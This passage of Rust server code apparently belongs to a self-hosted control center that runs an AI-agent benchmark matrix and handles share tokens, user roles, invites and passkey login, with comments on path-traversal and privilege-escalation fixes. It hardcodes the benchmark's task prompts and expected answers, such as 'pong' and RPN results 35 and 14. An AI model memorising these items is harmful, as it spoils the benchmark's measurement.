            let pgid = child.id() as i32;
            {
                let new_live = Some(MatrixLive {
                    job_id: job_id.to_string(), pgid, paused: false,
                    done: false, done_at: 0,
                    started_at, total_cells,
                    log_path: log_path.to_string_lossy().into_owned(),
                    result_dir: result_dir.to_string_lossy().into_owned(),
                });
                persist_matrix_live(&new_live);
                *matrix_live().lock().unwrap() = new_live;
            }
            let code = tokio::task::spawn_blocking(move || child.wait().map(|s| s.code().unwrap_or(-1)).unwrap_or(-1)).await.unwrap_or(-1);
            let finish_ts = crate::share::now_unix();
            {
                let mut lock = matrix_live().lock().unwrap();
                if let Some(ref mut l) = *lock {
                    l.done = true;
                    l.done_at = finish_ts;
                }
                persist_matrix_live(&*lock);
            }
            code
        }
        Err(e) => { eprintln!("matrix worker: spawn failed: {e}"); -1 }
    };

    // Archive kept workdirs into $OUT/cells/<agent>/<model_safe>/<task>/
    archive_matrix_cells(&result_dir);

    let status = if exit_code == 0 { MatrixJobStatus::Done } else { MatrixJobStatus::Failed };
    let mut q = matrix_queue().lock().unwrap();
    if let Some(j) = q.iter_mut().find(|j| j.id == job_id) {
        j.status = status;
        j.finished_at = Some(crate::share::now_unix());
        j.exit_code = Some(exit_code);
    }
}

/// After a KEEP=1 run: scan /tmp/rozum-agentic-* for workdirs whose agentic.meta
/// matches this run, then copy them into $OUT/cells/<agent>/<model_safe>/<task>/.
fn archive_matrix_cells(result_dir: &PathBuf) {
    let cells_root = result_dir.join("cells");
    let tmp = PathBuf::from("/tmp");
    let entries = match std::fs::read_dir(&tmp) {
        Ok(e) => e, Err(_) => return,
    };
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if !name.starts_with("rozum-agentic-") { continue; }
        let meta_path = entry.path().join("agentic.meta");
        let Ok(meta_text) = std::fs::read_to_string(&meta_path) else { continue };
        // Parse key=value
        let kv: std::collections::HashMap<&str, &str> = meta_text.lines()
            .filter_map(|l| l.split_once('='))
            .collect();
        let (agent, model, task) = match (kv.get("agent"), kv.get("model"), kv.get("task")) {
            (Some(&a), Some(&m), Some(&t)) if !a.is_empty() && !t.is_empty() => (a, m, t),
            _ => continue,
        };
        let safe_model = model.replace(['/', ':', ' '], "_");
        let dest = cells_root.join(agent).join(&safe_model).join(task);
        if dest.exists() { continue; } // already archived
        let _ = std::fs::create_dir_all(&dest);
        for file in ["agent.log", "verify.out", "triage.out", "agentic.meta", "cargo.err"] {
            let src = entry.path().join(file);
            if src.exists() { let _ = std::fs::copy(&src, dest.join(file)); }
        }
    }
}

/// Hardcoded task prompts and expected outputs matching agentic.sh's prompt_for().
fn matrix_task_info(task: &str) -> serde_json::Value {
    match task {
        "greet" => serde_json::json!({
            "label": "Greet",
            "difficulty": 1,
            "prompt": "Reply with exactly the single word: pong  (nothing else, no punctuation).",
            "expected": "output contains \"pong\""
        }),
        "build" => serde_json::json!({
            "label": "Build",
            "difficulty": 2,
            "prompt": "Create a minimal Rust binary project in the CURRENT directory: reverse-cli — reads its first CLI arg and prints it reversed. Then run `cargo run -- hello` and confirm it prints \"olleh\".",
            "expected": "cargo run -- hello == olleh"
        }),
        "fix" => serde_json::json!({
            "label": "Fix",
            "difficulty": 3,
            "prompt": "There is a Rust project in the current directory. `cargo run -- hello` prints \"hello\" instead of \"olleh\". Find and fix the one-line bug in src/main.rs, then confirm it prints \"olleh\".",
            "expected": "cargo run -- hello == olleh"
        }),
        "test" => serde_json::json!({
            "label": "Test",
            "difficulty": 4,
            "prompt": "Extend the reverse-cli project: implement a reverse() function and a #[test] that asserts reverse(\"hello\") == \"olleh\". Run `cargo test` (green) and `cargo run -- hello` (olleh).",
            "expected": "cargo test green AND cargo run -- hello == olleh"
        }),
        "debug" => serde_json::json!({
            "label": "Debug",
            "difficulty": 5,
            "prompt": "There is a Rust library in the current directory. `cargo test` fails due to a bug in src/lib.rs. Fix the bug (do NOT modify the test) so `cargo test` passes.",
            "expected": "cargo test green"
        }),
        "rpn" => serde_json::json!({
            "label": "RPN calc",
            "difficulty": 6,
            "prompt": "Create a Rust binary `rpn-calc` that evaluates a Reverse Polish Notation expression from its first CLI arg (space-separated tokens, integer arithmetic). Verify: `cargo run -- \"3 4 + 5 *\"` == 35 and `cargo run -- \"5 1 2 + 4 * + 3 -\"` == 14.",
            "expected": "both RPN expressions produce correct integer results"
        }),
        _ => serde_json::json!({ "label": task, "difficulty": null, "prompt": null, "expected": null }),
    }
}

#[derive(Deserialize)]
struct MatrixCellQuery {
    stamp: String,
    agent: String,
    model: String,
    task: String,
    #[serde(default = "default_tail")]
    tail: usize,
}

async fn matrix_cell_route(axum::extract::Query(q): axum::extract::Query<MatrixCellQuery>) -> axum::response::Response {
    use axum::response::IntoResponse;

    // Reject path-traversal in the segments joined onto the results dir below (stamp/agent/task raw,
    // model after its `/`→`_` normalization) — a crafted `../…` must not walk outside bench_results_dir.
    let safe_model = q.model.replace(['/', ':', ' '], "_");
    if !(safe_path_seg(&q.stamp) && safe_path_seg(&q.agent) && safe_path_seg(&q.task) && safe_path_seg(&safe_model)) {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "invalid stamp/agent/model/task segment");
    }

    // Find cell in the specified result dir
    let csv_path = bench_results_dir().join(&q.stamp).join("per-run.csv");
    let cell = parse_matrix_csv(&csv_path).into_iter().find(|c| {
        c.get("agent").and_then(|v| v.as_str()) == Some(&q.agent) &&
        c.get("model").and_then(|v| v.as_str()) == Some(&q.model) &&
        c.get("task").and_then(|v| v.as_str()) == Some(&q.task)
    });

    // Check for archived cell logs
    let cell_dir = bench_results_dir().join(&q.stamp).join("cells").join(&q.agent).join(&safe_model).join(&q.task);

    let agent_log = if cell_dir.join("agent.log").exists() {
        let text = std::fs::read_to_string(cell_dir.join("agent.log")).unwrap_or_default();
        let lines: Vec<&str> = text.lines().collect();
        let start = lines.len().saturating_sub(q.tail.min(3000));
        Some(lines[start..].join("\n"))
    } else { None };

    let verify_out = if cell_dir.join("verify.out").exists() {
        std::fs::read_to_string(cell_dir.join("verify.out")).ok()
    } else { None };

    let triage_out = if cell_dir.join("triage.out").exists() {
        std::fs::read_to_string(cell_dir.join("triage.out")).ok()
    } else { None };

    axum::Json(serde_json::json!({
        "cell": cell,
        "task_info": matrix_task_info(&q.task),
        "agent_log": agent_log,
        "verify_out": verify_out,
        "triage_out": triage_out,
        "has_logs": cell_dir.exists(),
    })).into_response()
}

fn matrix_fail(job_id: &str) {
    let mut q = matrix_queue().lock().unwrap();
    if let Some(j) = q.iter_mut().find(|j| j.id == job_id) {
        j.status = MatrixJobStatus::Failed;
        j.finished_at = Some(crate::share::now_unix());
    }
}

fn signal_matrix(sig: libc::c_int) -> bool {
    let live = matrix_live().lock().unwrap();
    if let Some(ref l) = *live {
        unsafe { libc::killpg(l.pgid, sig) == 0 }
    } else { false }
}

async fn matrix_pause_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let ok = signal_matrix(libc::SIGSTOP);
    if ok {
        let id = {
            let mut live = matrix_live().lock().unwrap();
            if let Some(ref mut l) = *live {
                l.paused = true;
                let id = l.job_id.clone();
                persist_matrix_live(&*live);
                id
            } else { String::new() }
        };
        if !id.is_empty() {
            let mut q = matrix_queue().lock().unwrap();
            if let Some(j) = q.iter_mut().find(|j| j.id == id) { j.status = MatrixJobStatus::Paused; }
        }
    }
    axum::Json(serde_json::json!({ "ok": ok })).into_response()
}

async fn matrix_resume_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let ok = signal_matrix(libc::SIGCONT);
    if ok {
        let id = {
            let mut live = matrix_live().lock().unwrap();
            if let Some(ref mut l) = *live {
                l.paused = false;
                let id = l.job_id.clone();
                persist_matrix_live(&*live);
                id
            } else { String::new() }
        };
        if !id.is_empty() {
            let mut q = matrix_queue().lock().unwrap();
            if let Some(j) = q.iter_mut().find(|j| j.id == id) { j.status = MatrixJobStatus::Running; }
        }
    }
    axum::Json(serde_json::json!({ "ok": ok })).into_response()
}

async fn matrix_stop_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    // SIGCONT first to unfreeze if paused, then SIGTERM
    signal_matrix(libc::SIGCONT);
    let ok = signal_matrix(libc::SIGTERM);
    axum::Json(serde_json::json!({ "ok": ok })).into_response()
}

async fn matrix_live_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    axum::Json(matrix_live_data()).into_response()
}

async fn public_matrix_live_route(
    axum::extract::Query(q): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let token = q.get("t").map(|s| s.as_str()).unwrap_or("");
    if !check_view_token(token) {
        return (axum::http::StatusCode::FORBIDDEN, axum::Json(serde_json::json!({ "error": "invalid or revoked token" }))).into_response();
    }
    axum::Json(matrix_live_data()).into_response()
}

// ── View tokens: secret public share links for the matrix ────────────────────────────────────────────
//
// A view token is a random 64-char hex string that grants read-only access to the matrix results
// without any login. The admin creates/revokes tokens; anyone with the URL can view.

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ViewToken {
    token: String,
    label: String,
    created_at: u64,
    revoked: bool,
}

fn view_tokens_path() -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-view-tokens.json")) }
fn load_view_tokens() -> Vec<ViewToken> { json_load(view_tokens_path()) }
fn save_view_tokens(v: &[ViewToken]) { json_save_rbac(view_tokens_path(), v); }

fn check_view_token(token: &str) -> bool {
    load_view_tokens().iter().any(|t| t.token == token && !t.revoked)
}

async fn public_matrix_route(
    axum::extract::Query(q): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let token = q.get("t").map(|s| s.as_str()).unwrap_or("");
    if !check_view_token(token) {
        return (axum::http::StatusCode::FORBIDDEN,
            axum::Json(serde_json::json!({ "error": "invalid or revoked token" }))).into_response();
    }
    // Re-use the same matrix status logic
    let queue: Vec<MatrixJob> = matrix_queue().lock().unwrap().clone();
    let last = latest_matrix_result().map(|(stamp, csv)| {
        let cells = parse_matrix_csv(&csv);
        let total = cells.len();
        let passed = cells.iter().filter(|c| c.get("pass").and_then(|v| v.as_i64()).unwrap_or(0) == 1).count();
        serde_json::json!({ "stamp": stamp, "cells": cells, "total": total, "passed": passed })
    });
    axum::Json(serde_json::json!({ "queue": queue, "last": last })).into_response()
}

async fn public_matrix_cell_route(
    axum::extract::Query(q): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let token = q.get("t").map(|s| s.as_str()).unwrap_or("");
    if !check_view_token(token) {
        return (axum::http::StatusCode::FORBIDDEN,
            axum::Json(serde_json::json!({ "error": "invalid or revoked token" }))).into_response();
    }
    let stamp = q.get("stamp").map(|s| s.as_str()).unwrap_or("");
    let agent = q.get("agent").map(|s| s.as_str()).unwrap_or("");
    let model = q.get("model").map(|s| s.as_str()).unwrap_or("");
    let task  = q.get("task").map(|s| s.as_str()).unwrap_or("");
    let tail: usize = q.get("tail").and_then(|s| s.parse().ok()).unwrap_or(200);
    // A view token grants read of the matrix results ONLY — reject path-traversal segments so an
    // anonymous token holder cannot walk `cell_dir`/`csv_path` outside bench_results_dir (arbitrary
    // file read + a dir-existence oracle otherwise).
    let safe_model = model.replace(['/', ':', ' '], "_");
    if !(safe_path_seg(stamp) && safe_path_seg(agent) && safe_path_seg(task) && safe_path_seg(&safe_model)) {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "invalid stamp/agent/model/task segment");
    }
    let csv_path = bench_results_dir().join(stamp).join("per-run.csv");
    let cell = parse_matrix_csv(&csv_path).into_iter().find(|c| {
        c.get("agent").and_then(|v| v.as_str()) == Some(agent) &&
        c.get("model").and_then(|v| v.as_str()) == Some(model) &&
        c.get("task").and_then(|v| v.as_str()) == Some(task)
    });
    let cell_dir = bench_results_dir().join(stamp).join("cells").join(agent).join(&safe_model).join(task);
    let agent_log = if cell_dir.join("agent.log").exists() {
        let text = std::fs::read_to_string(cell_dir.join("agent.log")).unwrap_or_default();
        let lines: Vec<&str> = text.lines().collect();
        let start = lines.len().saturating_sub(tail.min(3000));
        Some(lines[start..].join("\n"))
    } else { None };
    let verify_out = std::fs::read_to_string(cell_dir.join("verify.out")).ok();
    let triage_out = std::fs::read_to_string(cell_dir.join("triage.out")).ok();
    axum::Json(serde_json::json!({
        "cell": cell, "task_info": matrix_task_info(task),
        "agent_log": agent_log, "verify_out": verify_out,
        "triage_out": triage_out, "has_logs": cell_dir.exists(),
    })).into_response()
}

async fn view_token_page_route(
    axum::extract::Path(token): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::{http::{header, StatusCode}, response::IntoResponse};
    if !check_view_token(&token) {
        let body = "<!doctype html><html><head><meta charset=utf-8><title>rozum · link expired</title></head><body style='font:16px system-ui;text-align:center;padding:60px;background:#0f1117;color:#c9d1d9'>This link is invalid or has been revoked.</body></html>";
        return (StatusCode::GONE, [(header::CONTENT_TYPE, "text/html; charset=utf-8")], body).into_response();
    }
    // Inject token into view.html as a script var before </head>
    let inject = format!("<script>window._VIEW_TOKEN='{token}';</script>");
    // Re-read the file and inject
    let path = ucc_site_dir().join("view.html");
    match std::fs::read_to_string(&path) {
        Err(_) => (StatusCode::NOT_FOUND, "view.html not found").into_response(),
        Ok(html) => {
            let patched = if let Some(pos) = html.find("</head>") {
                format!("{}{}{}", &html[..pos], inject, &html[pos..])
            } else {
                format!("{inject}{html}")
            };
            ([(header::CONTENT_TYPE, "text/html; charset=utf-8"),
              (header::CACHE_CONTROL, "no-store")],
             patched).into_response()
        }
    }
}

// Admin view-token routes
async fn admin_view_tokens_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let tokens = load_view_tokens();
    let out: Vec<_> = tokens.iter().map(|t| serde_json::json!({
        "token": t.token, "label": t.label, "created_at": t.created_at, "revoked": t.revoked,
    })).collect();
    axum::Json(serde_json::json!({ "tokens": out })).into_response()
}

#[derive(Deserialize)] struct ViewTokenCreateReq { #[serde(default)] label: String }

async fn admin_view_token_create_route(
    axum::Json(req): axum::Json<ViewTokenCreateReq>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let token = rand_token();
    let mut tokens = load_view_tokens();
    tokens.push(ViewToken { token: token.clone(), label: req.label, created_at: crate::share::now_unix(), revoked: false });
    save_view_tokens(&tokens);
    axum::Json(serde_json::json!({ "ok": true, "token": token })).into_response()
}

async fn admin_view_token_revoke_route(
    axum::extract::Path(token): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let mut tokens = load_view_tokens();
    let Some(t) = tokens.iter_mut().find(|t| t.token == token) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "token not found");
    };
    t.revoked = true;
    save_view_tokens(&tokens);
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

// ── RBAC: users, roles, invites ──────────────────────────────────────────────────────────────────────
//
// Permissions: read | chat | agents | matrix | projects | admin (admin implies all).
// Roles = named groups of flags. Built-in: readonly, operator, admin.
// Users link one or more passkeys (one per device) to a role.
// Invites = tokens generated by admin; encode the role; single-use by default.

#[derive(Debug, Clone, Serialize, Deserialize)]
struct UccUser {
    id: String,
    display_name: String,
    role_ids: Vec<String>,
    passkey_ids: Vec<String>, // hex-encoded cred IDs
    created_at: u64,
    created_by: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct UccRole {
    id: String,
    name: String,
    permissions: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct UccInvite {
    token: String,
    role_id: String,
    label: String,
    created_by: String,
    created_at: u64,
    expires_at: Option<u64>,
    max_uses: Option<u32>,
    uses: u32,
    revoked: bool,
}

fn users_path()   -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-users.json")) }
fn roles_path()   -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-roles.json")) }
fn invites_path() -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-invites.json")) }

fn load_users()   -> Vec<UccUser>   { json_load(users_path())   }
fn load_roles()   -> Vec<UccRole>   { json_load(roles_path())   }
fn load_invites() -> Vec<UccInvite> { json_load(invites_path()) }
fn save_users(v: &[UccUser])     { json_save_rbac(users_path(),   v); }
fn save_roles(v: &[UccRole])     { json_save_rbac(roles_path(),   v); }
fn save_invites(v: &[UccInvite]) { json_save_rbac(invites_path(), v); }

fn json_load<T: serde::de::DeserializeOwned>(path: Option<PathBuf>) -> Vec<T> {
    path.and_then(|p| std::fs::read(p).ok()).and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
}
fn json_save_rbac<T: Serialize + ?Sized>(path: Option<PathBuf>, val: &T) {
    let Some(p) = path else { return };
    if let Ok(b) = serde_json::to_vec_pretty(val) {
        atomic_write_private(&p, &b); // 0600 — users/roles/invites/view-tokens are sensitive
    }
}

fn default_roles() -> Vec<UccRole> {
    vec![
        UccRole { id: "readonly".into(), name: "Read only".into(),
            permissions: vec!["read".into()] },
        UccRole { id: "operator".into(), name: "Operator".into(),
            permissions: vec!["read".into(),"chat".into(),"agents".into(),"matrix".into(),"projects".into()] },
        UccRole { id: "admin".into(), name: "Administrator".into(),
            permissions: vec!["admin".into()] },
    ]
}

/// First-boot: if passkeys exist but no users file, create the admin user and default roles.
fn ensure_rbac_initialized() {
    let users_exist = users_path().map(|p| p.exists()).unwrap_or(false);
    if users_exist { return; }
    let creds = load_creds_raw();
    if creds.is_empty() { return; }
    if load_roles().is_empty() { save_roles(&default_roles()); }
    let passkey_ids: Vec<String> = creds.iter().map(|p| cred_id_hex(p.cred_id())).collect();
    save_users(&[UccUser {
        id: Uuid::new_v4().to_string(),
        display_name: "Admin".into(),
        role_ids: vec!["admin".into()],
        passkey_ids,
        created_at: crate::share::now_unix(),
        created_by: None,
    }]);
}

fn cred_id_hex(id: &CredentialID) -> String {
    id.as_ref().iter().map(|b| format!("{b:02x}")).collect()
}

fn find_user_by_cred(cred_hex: &str) -> Option<UccUser> {
    load_users().into_iter().find(|u| u.passkey_ids.iter().any(|id| id == cred_hex))
}

fn user_has_perm(user_id: &str, perm: &str) -> bool {
    if user_id == "busi-sso" {
        // busi pairing authenticates the owner's device driving the separate busi app — grant it the
        // same permissions as the built-in "operator" role (read/chat/agents/matrix/projects), NOT
        // admin. Previously this was an unconditional `return true`, silently handing full UCC admin
        // (incl. user/role management) to any device merely paired with busi.
        return matches!(perm, "read" | "chat" | "agents" | "matrix" | "projects");
    }
    let users = load_users();
    let Some(user) = users.iter().find(|u| u.id == user_id) else { return false };
    let roles = load_roles();
    for rid in &user.role_ids {
        let Some(role) = roles.iter().find(|r| r.id == *rid) else { continue };
        if role.permissions.iter().any(|p| p == "admin" || p == perm) { return true; }
    }
    false
}

fn check_invite(token: &str) -> Result<UccInvite, &'static str> {
    let now = crate::share::now_unix();
    let Some(inv) = load_invites().into_iter().find(|i| i.token == token) else { return Err("invite not found"); };
    if inv.revoked { return Err("invite revoked"); }
    if let Some(exp) = inv.expires_at { if exp < now { return Err("invite expired"); } }
    if inv.uses >= inv.max_uses.unwrap_or(1) { return Err("invite already used"); }
    Ok(inv)
}

fn consume_invite(token: &str) {
    let mut invites = load_invites();
    if let Some(inv) = invites.iter_mut().find(|i| i.token == token) { inv.uses += 1; }
    save_invites(&invites);
}

fn rand_token() -> String {
    format!("{}{}", Uuid::new_v4().simple(), Uuid::new_v4().simple())
}

fn bootstrap_token_path() -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-bootstrap-token.txt")) }

/// First-registration TOFU hardening (ucc-tofu-bootstrap-token): while `users.is_empty()`, whoever
/// reaches `/control/auth/register/begin`+`finish` first would otherwise become the permanent admin
/// with no allowlist. A random token is generated once (persisted + logged, mirrors busi's own
/// "code shown on the computer" phone-pairing pattern) and required as the `invite` field on that
/// FIRST registration only — the same `check_invite`-gated mechanism every later registration
/// already uses, just bootstrapped before any admin/invite exists to issue one.
fn ensure_bootstrap_token() -> Option<String> {
    let path = bootstrap_token_path()?;
    if let Ok(existing) = std::fs::read_to_string(&path) {
        let t = existing.trim().to_string();
        if !t.is_empty() { return Some(t); }
    }
    let token = rand_token();
    if let Some(dir) = path.parent() { let _ = std::fs::create_dir_all(dir); }
    std::fs::write(&path, &token).ok()?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }
    Some(token)
}

/// One-shot: deleted once the first admin is created, like an invite with `max_uses: 1`.
fn consume_bootstrap_token() {
    if let Some(path) = bootstrap_token_path() { let _ = std::fs::remove_file(path); }
}

/// Constant-shape comparison isn't needed here (the token is single-use and file-based, not a
/// timing oracle worth defending) — this just centralizes the "both present and equal" rule so it
/// has one definition and one test, instead of being reconstructed inline at the call site.
fn bootstrap_token_matches(provided: Option<&str>, expected: Option<&str>) -> bool {
    provided.zip(expected).is_some_and(|(a, b)| a == b)
}

// ── Admin RBAC route handlers ──────────────────────────────────────────────────────────────────────

async fn admin_users_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let users = load_users();
    let roles = load_roles();
    let out: Vec<_> = users.iter().map(|u| {
        let role_names: Vec<&str> = u.role_ids.iter()
            .filter_map(|rid| roles.iter().find(|r| r.id == *rid).map(|r| r.name.as_str()))
            .collect();
        serde_json::json!({
            "id": u.id, "display_name": u.display_name,
            "role_ids": u.role_ids, "role_names": role_names,
            "passkey_count": u.passkey_ids.len(), "created_at": u.created_at,
        })
    }).collect();
    axum::Json(serde_json::json!({ "users": out, "roles": roles })).into_response()
}

#[derive(Deserialize)] struct SetRoleReq { role_ids: Vec<String> }

async fn admin_set_role_route(
    axum::extract::Path(id): axum::extract::Path<String>,
    axum::Json(req): axum::Json<SetRoleReq>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let mut users = load_users();
    let Some(u) = users.iter_mut().find(|u| u.id == id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "user not found");
    };
    u.role_ids = req.role_ids;
    save_users(&users);
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

async fn admin_delete_user_route(
    axum::extract::Path(id): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let mut users = load_users();
    let Some(pos) = users.iter().position(|u| u.id == id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "user not found");
    };
    let removed = users.remove(pos);
    save_users(&users);
    // Revoke the deleted user's passkeys too — otherwise the credential still passes the WebAuthn
    // ceremony and `login_finish` would issue a session for an unlinked credential. (delete = revoke)
    if !removed.passkey_ids.is_empty() {
        let creds: Vec<Passkey> = load_creds().into_iter()
            .filter(|p| !removed.passkey_ids.contains(&cred_id_hex(p.cred_id())))
            .collect();
        save_creds(&creds);
    }
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

async fn admin_roles_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let all_perms = ["read","chat","agents","matrix","projects","admin"];
    axum::Json(serde_json::json!({ "roles": load_roles(), "all_permissions": all_perms })).into_response()
}

#[derive(Deserialize)] struct RoleReq { name: String, #[serde(default)] permissions: Vec<String> }

async fn admin_create_role_route(axum::Json(req): axum::Json<RoleReq>) -> axum::response::Response {
    use axum::response::IntoResponse;
    if req.name.trim().is_empty() { return json_err(axum::http::StatusCode::BAD_REQUEST, "name required"); }
    let id = sanitize(&req.name.to_lowercase());
    let mut roles = load_roles();
    if roles.iter().any(|r| r.id == id) { return json_err(axum::http::StatusCode::CONFLICT, "role id exists"); }
    roles.push(UccRole { id: id.clone(), name: req.name, permissions: req.permissions });
    save_roles(&roles);
    axum::Json(serde_json::json!({ "ok": true, "id": id })).into_response()
}

async fn admin_update_role_route(
    axum::extract::Path(id): axum::extract::Path<String>,
    axum::Json(req): axum::Json<RoleReq>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let mut roles = load_roles();
    let Some(r) = roles.iter_mut().find(|r| r.id == id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "role not found");
    };
    r.name = req.name; r.permissions = req.permissions;
    save_roles(&roles);
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

async fn admin_delete_role_route(
    axum::extract::Path(id): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    if matches!(id.as_str(), "admin" | "operator" | "readonly") {
        return json_err(axum::http::StatusCode::FORBIDDEN, "built-in roles cannot be deleted");
    }
    let mut roles = load_roles();
    let before = roles.len();
    roles.retain(|r| r.id != id);
    if roles.len() == before { return json_err(axum::http::StatusCode::NOT_FOUND, "role not found"); }
    save_roles(&roles);
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

async fn admin_invites_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let now = crate::share::now_unix();
    let invites = load_invites();
    let roles = load_roles();
    let out: Vec<_> = invites.iter().map(|inv| {
        let role_name = roles.iter().find(|r| r.id == inv.role_id).map(|r| r.name.as_str()).unwrap_or(&inv.role_id);
        let active = !inv.revoked
            && inv.expires_at.map(|e| e > now).unwrap_or(true)
            && inv.uses < inv.max_uses.unwrap_or(1);
        serde_json::json!({
            "token": inv.token, "role_id": inv.role_id, "role_name": role_name,
            "label": inv.label, "created_at": inv.created_at,
            "expires_at": inv.expires_at, "max_uses": inv.max_uses,
            "uses": inv.uses, "revoked": inv.revoked, "active": active,
        })
    }).collect();
    axum::Json(serde_json::json!({ "invites": out })).into_response()
}

#[derive(Deserialize)]
struct InviteCreateReq {
    role_id: String,
    #[serde(default)] label: String,
    max_uses: Option<u32>,
    ttl_hours: Option<u64>,
}

async fn admin_invite_create_route(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    axum::Json(req): axum::Json<InviteCreateReq>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    if !load_roles().iter().any(|r| r.id == req.role_id) {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "unknown role_id");
    }
    let now = crate::share::now_unix();
    let token = rand_token();
    let mut invites = load_invites();
    invites.push(UccInvite {
        token: token.clone(), role_id: req.role_id, label: req.label,
        created_by: user_id, created_at: now,
        expires_at: req.ttl_hours.map(|h| now + h * 3600),
        max_uses: req.max_uses, uses: 0, revoked: false,
    });
    save_invites(&invites);
    axum::Json(serde_json::json!({ "ok": true, "token": token })).into_response()
}

async fn admin_revoke_invite_route(
    axum::extract::Path(token): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let mut invites = load_invites();
    let Some(inv) = invites.iter_mut().find(|i| i.token == token) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "invite not found");
    };
    inv.revoked = true;
    save_invites(&invites);
    axum::Json(serde_json::json!({ "ok": true })).into_response()
}

#[derive(Deserialize)] struct InviteInfoQuery { token: String }

async fn invite_info_route(
    axum::extract::Query(q): axum::extract::Query<InviteInfoQuery>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    match check_invite(&q.token) {
        Err(e) => json_err(axum::http::StatusCode::GONE, e),
        Ok(inv) => {
            let roles = load_roles();
            let role = roles.iter().find(|r| r.id == inv.role_id);
            axum::Json(serde_json::json!({
                "valid": true, "role_id": inv.role_id,
                "role_name": role.map(|r| r.name.as_str()).unwrap_or(&inv.role_id),
                "permissions": role.map(|r| r.permissions.as_slice()).unwrap_or(&[]),
                "label": inv.label,
                "uses_remaining": inv.max_uses.map(|m| m - inv.uses),
            })).into_response()
        }
    }
}

// ── Phase 4a: auth gate — own Face ID (WebAuthn) OR busi SSO ─────────────────────────────────────────
//
// Two auth sources, either suffices: (1) the UCC's OWN passkey (Face ID) via webauthn-rs — a `rozum_sess`
// cookie after login; (2) busi SSO — a `busi_device` cookie that is a paired busi token. The gate protects
// every control action + the terminal WS. RP ID = the Tailscale host (same passkey domain as busi).

use std::sync::{Mutex, OnceLock};
use webauthn_rs::prelude::*;

fn rp_id() -> String {
    std::env::var("ROZUM_UCC_RP_ID").unwrap_or_else(|_| "busi.tail1174e2.ts.net".into())
}
fn rp_origin() -> String {
    // Stale default was `:8447`, left over from the old two-port (SPA + control-API) layout
    // (docs/specs/unified-control-center.md). The SPA and API are now consolidated behind one
    // Tailscale-serve port, `:8448` (see `deploy-ucc-web.sh`) — a WebAuthn ceremony validates the
    // browser's actual origin against this, so a stale port here would reject every login/register.
    std::env::var("ROZUM_UCC_ORIGIN").unwrap_or_else(|_| "https://busi.tail1174e2.ts.net:8448".into())
}
#[allow(dead_code)]
fn operator_uuid() -> Uuid { Uuid::from_u128(0x_524f_5a55_4d00_0000_0000_0000_0000_0001) }

fn webauthn() -> Option<&'static Webauthn> {
    static W: OnceLock<Option<Webauthn>> = OnceLock::new();
    W.get_or_init(|| {
        let origin = url::Url::parse(&rp_origin()).ok()?;
        WebauthnBuilder::new(&rp_id(), &origin).ok()?.rp_name("rozum control").build().ok()
    }).as_ref()
}

fn creds_path() -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-credentials.json")) }
fn load_creds_raw() -> Vec<Passkey> {
    creds_path().and_then(|p| std::fs::read(p).ok()).and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
}
fn load_creds() -> Vec<Passkey> { load_creds_raw() }
fn save_creds(c: &[Passkey]) {
    if let Some(p) = creds_path() {
        if let Ok(b) = serde_json::to_vec_pretty(c) {
            atomic_write_private(&p, &b); // 0600 — WebAuthn credentials
        }
    }
}

// In-flight ceremony state.
struct RegInflight { state: PasskeyRegistration, invite_token: Option<String>, display_name: String }
fn reg_inflight() -> &'static Mutex<Option<RegInflight>> {
    static S: OnceLock<Mutex<Option<RegInflight>>> = OnceLock::new();
    S.get_or_init(|| Mutex::new(None))
}
fn auth_inflight() -> &'static Mutex<Option<PasskeyAuthentication>> {
    static S: OnceLock<Mutex<Option<PasskeyAuthentication>>> = OnceLock::new();
    S.get_or_init(|| Mutex::new(None))
}

